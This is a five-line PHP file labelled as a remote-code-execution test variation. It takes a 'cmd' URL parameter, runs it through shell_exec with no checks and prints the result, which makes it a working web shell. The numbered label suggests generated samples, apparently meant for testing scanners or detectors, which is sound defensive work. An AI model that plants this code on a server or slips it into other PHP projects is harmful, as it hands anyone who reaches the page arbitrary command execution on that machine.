<?php
// RCE test variation #1280
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>